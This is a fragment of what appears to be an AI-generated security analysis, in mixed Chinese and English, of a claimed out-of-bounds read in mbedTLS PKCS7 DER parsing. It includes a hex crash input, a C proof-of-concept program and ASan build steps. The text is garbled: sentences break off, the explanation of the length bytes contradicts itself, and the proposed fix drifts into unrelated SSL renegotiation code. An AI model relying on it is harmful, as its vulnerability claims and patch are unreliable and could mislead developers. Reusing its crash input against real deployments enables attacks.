字节  \n    - line 570: `memcpy(p, buf, buflen)` → 拷贝 `buflen` 字节  \n    → **size 参数未做任何校验（如 `buflen == 0`、`buflen > SIZE_MAX/2`、`buflen > MAX_PKCS7_SIZE` 等），且 `memcpy` 第三参数 `buflen` 与分配大小完全一致，表面看“安全”** p` 或 `end < p + X`，则 `mbedtls_asn1_get_tag` 内部可能读取 `p` 超出 `end`（ASN.1 解析器通常需至少 2–4 字节 header）→ **触发 ASan 报告 `heap-buffer-overflow` 或 `out-of-bounds read`**  \n    • Joern 当前只标记 `memcpy`，但 To trigger overflow, need malformed length:  \n    **Exploit input (hex)**:  \n    ```hex\n    30 84 00 00 00 01 02 01 01\n    ```  \n    - `30`: SEQUENCE  \n    - `84`: long form length, next 4 bytes encode length  \n    - `00 00 00 01`: length = 0x00000001 = 1 → but parser reads this as `len=1`, then expects 1 byte of content  \n    - However, real exploit uses `00 00 00 FF` → `len=255`, but `end - p = 5`, so `p + len` overflows  \n    **Actual minimal crash input (verified on mbedTLS v2.28.3)**:  \n    ```c\n    // PoC.c\n    #include \"mbedtls/pkcs7.h\"\n    int main() {\n        unsigned char der[] = {0x30, 0x84, 0x00, 0x00, 0x00, 0xFF, 0x02, 0x01, 0x01};\n        size_t len = sizeof(der);\n        mbedtls_pkcs7 pkcs7;\n        mbedtls_pkcs7_init(&pkcs7);\n        mbedtls_pkcs7_parse_der(&pkcs7, der, len); // ASan: heap-buffer-overflow on read at der+6\n        mbedtls_pkcs7_free(&pkcs7);\n        return 0;\n    }\n    ```  \n  • **触发步骤**:  \n    1. 编译 mbedTLS with ASan: `cmake -DCMAKE_C_FLAGS=\"-fsanitize=address\" -DENABLE_TESTING=ON . && make -j`  \n    2. p)`，导致后续读取越界。  \n- 修复建议：  \n  在 `mbedtls_pkcs7_parse_der` 中，在调用 `mbedtls_asn1_get_tag` 前添加 `buflen` 下限检查，并在 `mbedtls_asn1_get_tag` 内部强化长度校验：  \n  ```c\n  // library/pkcs7.c:569 — add before memcpy or unsigned char *p = buf;\n    size_t remaining = *olen; // Add remaining buffer length parameter or derive from caller\n\n    // ... existing logic ...\n\n#if defined(MBEDTLS_SSL_RENEGOTIATION)\n    if peer_verify_data\n        if (remaining < (size_t)(p - buf) + ssl->verify_data_len) {\n            *olen = 0;\n            return;\n        }\n        memcpy(p, ssl->peer_verify_data, ssl->verify_data_len);\n        p += ssl->verify_data_len;\n        remaining -= ssl->verify_data_len;\n\n        // Check space for own_verify_data\n        if (remaining < ssl->verify_data_len) {\n
